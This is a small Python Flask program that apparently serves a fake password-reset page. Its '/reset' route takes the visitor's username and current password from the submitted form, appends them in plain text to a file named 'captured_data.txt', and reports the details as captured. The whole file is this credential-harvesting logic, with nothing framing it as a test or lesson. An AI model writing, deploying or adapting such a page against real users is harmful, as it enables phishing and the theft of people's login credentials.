from flask import Flask, request, render_template

app = Flask(__name__)



@app.route('/reset', methods=['GET', 'POST'])
def reset():
    if request.method == 'POST':
        # Capture the form data
        username = request.form['username']
        current_password = request.form['current_password']
        # Log the data to a file
        with open('captured_data.txt', 'a') as file:
            file.write(f"Username: {username}, Current Password: {current_password}\n")
        return "Details captured successfully!"
    return render_template('reset.html')

if __name__ == '__main__':
    app.run(debug=True)

